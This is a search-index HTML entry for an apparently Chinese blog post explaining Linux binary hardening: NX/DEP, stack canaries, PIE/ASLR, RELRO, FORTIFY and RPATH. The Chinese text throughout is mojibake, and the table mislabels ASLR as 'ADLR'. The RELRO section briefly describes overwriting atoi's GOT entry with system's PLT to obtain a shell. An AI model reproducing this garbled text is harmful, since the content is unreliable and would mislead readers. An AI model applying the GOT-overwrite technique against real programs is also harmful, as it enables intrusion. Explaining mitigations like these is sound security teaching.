    <content type="html"><![CDATA[<h2 id="NX"><a href="#NX" class="headerlink" title="NX"></a>NX</h2><p>æ•°æ®ä¸å¯æ‰§è¡Œã€‚åŸç†æ˜¯å°†æ•°æ®æ‰€åœ¨å†…å­˜é¡µæ ‡è¯†ä¸ºä¸å¯æ‰§è¡Œï¼Œé˜²æ­¢å› ä¸ºç¨‹åºè¿è¡Œå‡ºç°æº¢å‡ºè€Œä½¿å¾—æ”»å‡»è€…çš„shellcodeå¯èƒ½ä¼šåœ¨æ•°æ®åŒºå°è¯•æ‰§è¡Œçš„æƒ…å†µã€‚NXåœ¨å’±å±¡æˆ˜å±¡è´¥çš„ç»å…¸æ ˆæº¢å‡ºå®éªŒä¸­æœ‰æ¥è§¦è¿‡ï¼ŒNXæ˜¯å¯¹æ ˆå’Œå †çš„ä¸€ç§ä¿æŠ¤æœºåˆ¶ã€‚å®éªŒéœ€è¦å…³é—­NXå’Œåœ°å€éšæœºåŒ–ï¼Œå¦åˆ™æ‰§è¡Œshellcodeæ—¶ï¼ŒCPUå°±ä¼šæŠ›å‡ºå¼‚å¸¸ï¼Œè€Œä¸æ˜¯å»æ‰§è¡Œæ¶æ„æŒ‡ä»¤ã€‚<br>Linuxç³»ç»Ÿå«åšNXï¼ŒWindowsç³»ç»Ÿä¸­ç±»ä¼¼çš„æœºåˆ¶å«DEP(Data Execute Prevention)ã€‚</p><h2 id="Stack-Canary"><a href="#Stack-Canary" class="headerlink" title="Stack Canary"></a>Stack Canary</h2><p>æ ˆä¿æŠ¤ã€‚æ ˆæº¢å‡ºä¿æŠ¤æ˜¯ä¸€ç§ç¼“å†²åŒºæº¢å‡ºæ”»å‡»ç¼“è§£æ‰‹æ®µã€‚å¯ç”¨æ ˆä¿æŠ¤åï¼Œå‡½æ•°å¼€å§‹æ‰§è¡Œçš„æ—¶å€™ä¼šå…ˆå¾€æ ˆé‡Œæ’å…¥cookieä¿¡æ¯ï¼Œå½“å‡½æ•°çœŸæ­£è¿”å›çš„æ—¶å€™ä¼šéªŒè¯cookieä¿¡æ¯æ˜¯å¦åˆæ³•ï¼Œå¦‚æœä¸åˆæ³•å°±åœæ­¢ç¨‹åºè¿è¡Œã€‚æ”»å‡»è€…åœ¨è¦†ç›–è¿”å›åœ°å€çš„æ—¶å€™å¾€å¾€ä¹Ÿä¼šå°†cookieä¿¡æ¯ç»™è¦†ç›–æ‰ï¼Œå¯¼è‡´æ ˆä¿æŠ¤æ£€æŸ¥å¤±è´¥è€Œé˜»æ­¢shellcodeçš„æ‰§è¡Œã€‚åœ¨Linuxä¸­æˆ‘ä»¬å°†cookieä¿¡æ¯ç§°ä¸ºcanaryã€‚<br>ç®€å•æ¥è¯´å°±æ˜¯é€šè¿‡éªŒè¯cookieï¼Œæ¥åˆ¤æ–­æ‰§è¡Œçš„ä»£ç æ˜¯ä¸æ˜¯æ¶æ„ä»£ç ã€‚</p><h2 id="PIE-ASLR"><a href="#PIE-ASLR" class="headerlink" title="PIE / ASLR"></a>PIE / ASLR</h2><p>åœ°å€éšæœºåŒ–ã€‚å°±æ˜¯ä¿è¯åŒä¸€ä¸ªç¨‹åºä»»æ„ä¸¤æ¬¡è¿è¡Œæ—¶çš„å †æ ˆåŸºå€æ˜¯ä¸åŒçš„ã€‚å¦‚æœå †æ ˆåŸºå€ä¸å˜ä¼šæ€æ ·ï¼Ÿä¸å˜å°±å¯èƒ½è¢«æ”»å‡»ï¼Œå› ä¸ºæ”»å‡»è€…èƒ½ç¡®è®¤ç¨‹åºçš„å†…å­˜åœ°å€ï¼Œç„¶åé€šè¿‡è¦†ç›–è¿”å›åœ°å€åœ¨ç­‰æ‰‹æ®µæ‰§è¡Œæ¶æ„ä»£ç ã€‚å’±å±¡æˆ˜å±¡è´¥çš„ç»å…¸æ ˆæº¢å‡ºå®éªŒå°±æ˜¯é€šè¿‡è¦†ç›–è¿”å›åœ°å€æ‰§è¡Œæ¶æ„ä»£ç ã€‚</p><table><thead><tr><th></th><th>éšæœºåŒ–æ®µ</th><th>è®¾ç½®</th></tr></thead><tbody><tr><td>ADLR</td><td>å †ã€æ ˆã€mmapï¼ˆlibcåº“ï¼‰ã€VDSO page</td><td>ç”±æ“ä½œç³»ç»Ÿè®¾ç½®</td></tr><tr><td>PIE</td><td>æ•°æ®æ®µã€ä»£ç æ®µ</td><td>ç”±ç¼–è¯‘å™¨è®¾ç½®</td></tr></tbody></table><h2 id="Relro"><a href="#Relro" class="headerlink" title="Relro"></a>Relro</h2><p>åªè¯»é‡å®šä½ã€‚è®¾ç½®ç¬¦å·é‡å®šå‘è¡¨æ ¼ä¸ºåªè¯»æˆ–åœ¨ç¨‹åºå¯åŠ¨æ—¶å°±è§£æå¹¶ç»‘å®šæ‰€æœ‰åŠ¨æ€ç¬¦å·ï¼Œä»è€Œå‡å°‘å¯¹GOTæ”»å‡»ã€‚åœ¨Linuxä¸­æœ‰â€Partial RELROâ€ â€œFull RELROâ€ä¸¤ç§æ¨¡å¼ï¼Œé»˜è®¤å¼€å¯Partical RELROï¼Œå¼€å¯Partical RELROæ—¶ï¼ŒGOTæ˜¯å¯å†™çš„ï¼Œå¼€å¯ FULL RELRO æ—¶ï¼ŒGOTè¡¨æ˜¯åªè¯»çš„ã€‚<br> ä¸»è¦ç”¨æ¥ä¿æŠ¤é‡å®šä½è¡¨æ®µå¯¹åº”æ•°æ®åŒºåŸŸï¼Œé»˜è®¤å¯å†™ </p><ol><li>Partial RELROï¼š gotè¡¨ä¸å¯å†™ï¼Œgot.pltå¯å†™ </li><li>Full RELROï¼š gotè¡¨ï¼Œgot.pltä¸å¯å†™  </li></ol><p>éƒ¨åˆ†RELRO æ˜“å—åˆ°æ”»å‡»ï¼Œä¾‹å¦‚æ”»å‡»è€…å¯ä»¥<strong>atoi.gotä¸ºsystem.pltï¼Œè¿›è€Œè¾“å…¥/bin/sh\x00è·å¾—shell</strong><br>å®Œå…¨RELRO ä½¿æ•´ä¸ª GOT åªè¯»ï¼Œä»è€Œæ— æ³•è¢«è¦†ç›–ï¼Œä½†è¿™æ ·ä¼šå¤§å¤§å¢åŠ ç¨‹åºçš„å¯åŠ¨æ—¶é—´ï¼Œå› ä¸ºç¨‹åºåœ¨å¯åŠ¨ä¹‹å‰éœ€è¦è§£ææ‰€æœ‰çš„ç¬¦å·ã€‚<br>å‚è€ƒï¼š</p><h2 id="FORTIFY"><a href="#FORTIFY" class="headerlink" title="FORTIFY"></a>FORTIFY</h2><p>åœ¨ç¼–è¯‘çš„æ—¶å€™æ£€æŸ¥æºç æ˜¯å¦å­˜åœ¨ç¼“å†²åŒºæº¢å‡ºç­‰é”™è¯¯ã€‚<br>ç®€å•åœ°è¯´ï¼ŒåŠ äº†è¿™ä¸ªä¿æŠ¤ä¹‹å,ä¸€äº›æ•æ„Ÿå‡½æ•°å¦‚read, fgets,memcpy, printfç­‰ç­‰å¯èƒ½å¯¼è‡´æ¼æ´å‡ºç°çš„å‡½æ•°éƒ½ä¼šè¢«æ›¿æ¢æˆ__read_chk,__fgets_chk, __memcpy_chk, __printf_chkç­‰ã€‚<br>è¿™äº›å¸¦äº†chkçš„å‡½æ•°ä¼šæ£€æŸ¥è¯»å–/å¤åˆ¶çš„å­—èŠ‚é•¿åº¦æ˜¯å¦è¶…è¿‡ç¼“å†²åŒºé•¿åº¦ï¼Œé€šè¿‡æ£€æŸ¥è¯¸å¦‚%nä¹‹ç±»çš„å­—ç¬¦ä¸²ä½ç½®æ˜¯å¦ä½äºå¯èƒ½è¢«ç”¨æˆ·ä¿®æ”¹çš„å¯å†™åœ°å€ï¼Œé¿å…äº†æ ¼å¼åŒ–å­—ç¬¦ä¸²è·³è¿‡æŸäº›å‚æ•°ï¼ˆå¦‚ç›´æ¥%7$xï¼‰ç­‰æ–¹å¼æ¥é¿å…æ¼æ´å‡ºç°ã€‚</p><h2 id="BRATH"><a href="#BRATH" class="headerlink" title="BRATH"></a>BRATH</h2><p>ç¨‹åºè¿è¡Œæ—¶çš„ç¯å¢ƒå˜é‡ï¼Œè¿è¡Œæ—¶æ‰€éœ€è¦çš„å…±äº«åº“æ–‡ä»¶ä¼˜å…ˆä»è¯¥ç›®å½•å¯»æ‰¾ï¼Œå¯ä»¥fake libé€ æˆæ”»å‡»ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
